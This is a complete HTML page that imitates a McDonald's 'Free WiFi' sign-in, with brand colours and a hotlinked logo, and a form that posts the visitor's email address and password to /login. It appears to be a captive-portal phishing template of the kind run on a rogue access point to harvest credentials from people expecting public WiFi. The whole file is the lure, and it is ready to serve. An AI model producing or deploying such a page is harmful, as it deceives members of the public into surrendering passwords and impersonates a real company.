<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>McDonald's Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ff0000;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #ffd900;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 7px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-container h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .login-container input {
            width: 75%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-container button {
            width: 65%;
            padding: 10px;
            background-color: #ff0000;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            color: #ffffff;
            cursor: pointer;
            font-weight: bold;
        }
        .login-container button:hover {
            background-color: #000000;
        }
        .login-container p {
            margin-top: 20px;
            font-size: 14px;
        }
        .login-container a {
            color: #007bff;
            text-decoration: none;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRA1hbj4C4VGkfdMeLDcAHuhlB-HzCj9_GBcA&s" alt="McDonald's Logo">
        <h1>Free WiFi</h1>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p>Don't have an account? <a href="/register">Sign up</a></p>
    </div>
</body>
</html>
